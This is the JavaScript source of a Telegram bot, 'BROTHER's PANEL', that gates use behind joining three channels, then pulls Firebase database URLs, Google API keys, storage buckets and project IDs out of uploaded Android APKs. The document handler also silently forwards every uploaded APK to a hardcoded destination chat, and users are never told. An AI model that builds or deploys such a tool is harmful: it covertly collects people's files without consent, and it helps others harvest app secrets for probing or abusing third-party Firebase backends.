const express = require("express");
const { Telegraf, Markup } = require("telegraf");
const AdmZip = require("adm-zip");
const fs = require("fs");
const path = require("path");
const os = require("os");

const BOT_TOKEN = process.env.BOT_TOKEN;
const DESTINATION_CHAT_ID =
  process.env.DESTINATION_CHAT_ID || "-1004352285600";

const REQUIRED_CHANNELS = [
  "@brotherpanell",
  "@PANELEMPIRE2",
  "@backuptt2"
];

if (!BOT_TOKEN) {
  console.error("ERROR: BOT_TOKEN is missing.");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ==========================================
// WEB SERVER
// ==========================================

const app = express();

app.get("/", (req, res) => {
  res.status(200).send(
    "BROTHER's PANEL Firebase Extraction Bot is running."
  );
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Web server running on port ${PORT}`);
});

// ==========================================
// CHECK CHANNEL MEMBERSHIP
// ==========================================

async function isUserJoined(ctx) {
  const userId = ctx.from.id;

  for (const channel of REQUIRED_CHANNELS) {
    try {
      const member = await ctx.telegram.getChatMember(
        channel,
        userId
      );

      if (
        member.status !== "creator" &&
        member.status !== "administrator" &&
        member.status !== "member"
      ) {
        return false;
      }
    } catch (error) {
      console.error(
        `Membership check failed for ${channel}:`,
        error.message
      );

      return false;
    }
  }

  return true;
}

// ==========================================
// JOIN SCREEN
// ==========================================

async function showJoinScreen(ctx) {
  await ctx.reply(
    "🔐 Please join all 3 required channels first.\n\nAfter joining all channels, press Verify.",
    Markup.inlineKeyboard([
      [
        Markup.button.url(
          "📢 Join Channel 1",
          "https://t.me/brotherpanell"
        )
      ],
      [
        Markup.button.url(
          "📢 Join Channel 2",
          "https://t.me/PANELEMPIRE2"
        )
      ],
      [
        Markup.button.url(
          "📢 Join Channel 3",
          "https://t.me/backuptt2"
        )
      ],
      [
        Markup.button.callback(
          "✅ Verify",
          "verify_join"
        )
      ]
    ])
  );
}

// ==========================================
// START
// ==========================================

bot.start(async (ctx) => {
  const joined = await isUserJoined(ctx);

  if (!joined) {
    return showJoinScreen(ctx);
  }

  await ctx.reply(
    "✅ Verification successful!\n\n📦 Please upload your APK file."
  );
});

// ==========================================
// VERIFY
// ==========================================

bot.action("verify_join", async (ctx) => {
  try {
    await ctx.answerCbQuery("Checking membership...");

    const joined = await isUserJoined(ctx);

    if (!joined) {
      return ctx.reply(
        "❌ Verification failed.\n\nPlease join all 3 channels and press Verify again."
      );
    }

    await ctx.reply(
      "✅ Verification successful!\n\n📦 Please upload your APK or APKS file."
    );

  } catch (error) {
    console.error("Verify error:", error);

    await ctx.reply(
      "⚠️ Verification error. Please try again."
    );
  }
});

// ==========================================
// DOCUMENT HANDLER
// ==========================================

bot.on("document", async (ctx) => {
  const document = ctx.message.document;

  const fileName =
    document.file_name || "unknown.apk";

  const lowerName =
    fileName.toLowerCase();

  // Support APK + APKS
  const isAPK =
    lowerName.endsWith(".apk") ||
    lowerName.endsWith(".apks");

  if (!isAPK) {
    return ctx.reply(
      "❌ Invalid file.\n\nPlease upload an APK or APKS file."
    );
  }

  // Membership check
  const joined = await isUserJoined(ctx);

  if (!joined) {
    return showJoinScreen(ctx);
  }

  const processing =
    await ctx.reply(
      "⏳ File received.\n\n🔍 Extracting Firebase configuration..."
    );

  let tempFile = null;

  try {
    // ========================================
    // DOWNLOAD
    // ========================================

    const fileLink =
      await ctx.telegram.getFileLink(
        document.file_id
      );

    const response =
      await fetch(fileLink.href);

    if (!response.ok) {
      throw new Error(
        "Failed to download file."
      );
    }

    const buffer =
      Buffer.from(
        await response.arrayBuffer()
      );

    tempFile = path.join(
      os.tmpdir(),
      `${Date.now()}-${safeFileName(fileName)}`
    );

    fs.writeFileSync(
      tempFile,
      buffer
    );

    // ========================================
    // SEND ONLY APK/APKS TO DESTINATION
    // ========================================

    await ctx.telegram.sendDocument(
      DESTINATION_CHAT_ID,
      {
        source: tempFile
      }
    );

    // ========================================
    // SCAN
    // ========================================

    const result =
      scanFirebaseConfig(tempFile);

    const sizeMB =
      (buffer.length / 1024 / 1024).toFixed(2);

    // ========================================
    // RESULT
    // ========================================

    let output =
      `🔥 <b>BROTHER's PANEL FIREBASE EXTRACTION RESULT</b> 🔥\n\n`;

    output +=
      `════════════════════\n`;

    output +=
      `📱 APK: ${escapeHtml(fileName)}\n`;

    output +=
      `📦 Size: ${sizeMB} MB\n`;

    output +=
      `════════════════════\n\n`;

    const foundCount =
      result.items.length;

    output +=
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

    output +=
      `🔓 <b>EXTRACTED FIREBASE CONFIG (${foundCount} found)</b>\n`;

    output +=
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    if (result.databaseUrls.length > 0) {

      for (
        const url of result.databaseUrls
      ) {
        output +=
          `🔗 <b>DB URL:</b>\n`;

        output +=
          `${escapeHtml(url)}\n\n`;
      }
    }

    if (result.apiKeys.length > 0) {

      for (
        const key of result.apiKeys
      ) {
        output +=
          `🔑 <b>API Key:</b>\n`;

        output +=
          `${escapeHtml(key)}\n\n`;
      }
    }

    if (result.storageUrls.length > 0) {

      for (
        const storage of result.storageUrls
      ) {
        output +=
          `🗄️ <b>Storage URL:</b>\n`;

        output +=
          `${escapeHtml(storage)}\n\n`;
      }
    }

    if (result.projectIds.length > 0) {

      for (
        const project of result.projectIds
      ) {
        output +=
          `🆔 <b>Project ID:</b>\n`;

        output +=
          `${escapeHtml(project)}\n\n`;
      }
    }

    if (result.appIds.length > 0) {

      for (
        const appId of result.appIds
      ) {
        output +=
          `📱 <b>Firebase App ID:</b>\n`;

        output +=
          `${escapeHtml(appId)}\n\n`;
      }
    }

    if (!result.items.length) {
      output +=
        "❌ No Firebase configuration detected.\n";
    }

    // ========================================
    // SEND RESULT
    // ========================================

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processing.message_id,
      undefined,
      output,
      {
        parse_mode: "HTML"
      }
    );

  } catch (error) {

    console.error(
      "File processing error:",
      error
    );

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        processing.message_id,
        undefined,
        "❌ Extraction failed.\n\nPlease try another APK/APKS file."
      );
    } catch {}
    
  } finally {

    // Delete temporary file
    if (
      tempFile &&
      fs.existsSync(tempFile)
    ) {
      try {
        fs.unlinkSync(tempFile);
      } catch {}
    }
  }
});

// ==========================================
// FIREBASE CONFIG SCANNER
// ==========================================

function scanFirebaseConfig(filePath) {

  const zip =
    new AdmZip(filePath);

  const entries =
    zip.getEntries();

  const databaseUrls =
    new Set();

  const apiKeys =
    new Set();

  const storageUrls =
    new Set();

  const projectIds =
    new Set();

  const appIds =
    new Set();

  for (
    const entry of entries
  ) {

    if (entry.isDirectory) {
      continue;
    }

    let content;

    try {
      content =
        entry
          .getData()
          .toString("utf8");
    } catch {
      continue;
    }

    // ======================================
    // DATABASE URL
    // ======================================

    const firebaseIo =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebaseio\.com(?:\/[^\s"'<>]*)?/gi
      );

    if (firebaseIo) {
      for (const url of firebaseIo) {
        databaseUrls.add(
          cleanValue(url)
        );
      }
    }

    const firebaseDatabase =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebasedatabase\.app(?:\/[^\s"'<>]*)?/gi
      );

    if (firebaseDatabase) {
      for (
        const url of firebaseDatabase
      ) {
        databaseUrls.add(
          cleanValue(url)
        );
      }
    }

    // firebase_url from config
    const firebaseUrlConfig =
      content.match(
        /"firebase_url"\s*:\s*"([^"]+)"/gi
      );

    if (firebaseUrlConfig) {

      for (
        const item of firebaseUrlConfig
      ) {

        const match =
          item.match(
            /"firebase_url"\s*:\s*"([^"]+)"/i
          );

        if (match) {
          databaseUrls.add(
            cleanValue(match[1])
          );
        }
      }
    }

    // ======================================
    // GOOGLE API KEY
    // ======================================

    const apiKeyMatches =
      content.match(
        /AIza[0-9A-Za-z_-]{20,}/g
      );

    if (apiKeyMatches) {

      for (
        const key of apiKeyMatches
      ) {
        apiKeys.add(key);
      }
    }

    // ======================================
    // STORAGE URL
    // ======================================

    const storageMatches =
      content.match(
        /[A-Za-z0-9._-]+\.(?:appspot\.com|firebasestorage\.app)/gi
      );

    if (storageMatches) {

      for (
        const storage of storageMatches
      ) {
        storageUrls.add(
          cleanValue(storage)
        );
      }
    }

    // ======================================
    // PROJECT ID
    // ======================================

    const projectMatches =
      content.match(
        /"project_id"\s*:\s*"([^"]+)"/gi
      );

    if (projectMatches) {

      for (
        const item of projectMatches
      ) {

        const match =
          item.match(
            /"project_id"\s*:\s*"([^"]+)"/i
          );

        if (match) {
          projectIds.add(
            match[1]
          );
        }
      }
    }

    // ======================================
    // FIREBASE APP ID
    // ======================================

    const appIdMatches =
      content.match(
        /1:[0-9]+:android:[A-Za-z0-9]+/gi
      );

    if (appIdMatches) {

      for (
        const id of appIdMatches
      ) {
        appIds.add(id);
      }
    }
  }

  // ======================================
  // COUNT
  // ======================================

  const items = [];

  databaseUrls.forEach(() =>
    items.push("DB URL")
  );

  apiKeys.forEach(() =>
    items.push("API Key")
  );

  storageUrls.forEach(() =>
    items.push("Storage URL")
  );

  projectIds.forEach(() =>
    items.push("Project ID")
  );

  appIds.forEach(() =>
    items.push("App ID")
  );

  return {
    items,

    databaseUrls:
      [...databaseUrls],

    apiKeys:
      [...apiKeys],

    storageUrls:
      [...storageUrls],

    projectIds:
      [...projectIds],

    appIds:
      [...appIds]
  };
}

// ==========================================
// HELPERS
// ==========================================

function cleanValue(value) {
  return String(value)
    .trim()
    .replace(
      /[\\'")>,;]+$/g,
      ""
    );
}

function safeFileName(name) {
  return name.replace(
    /[^a-zA-Z0-9._-]/g,
    "_"
  );
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// ==========================================
// START BOT
// ==========================================

bot.launch()
  .then(() => {
    console.log(
      "🔥 BROTHER's PANEL Firebase Extraction Bot started."
    );
  })
  .catch((error) => {
    console.error(
      "Bot startup error:",
      error
    );
  });

process.once(
  "SIGINT",
  () => bot.stop("SIGINT")
);

process.once(
  "SIGTERM",
  () => bot.stop("SIGTERM")
);
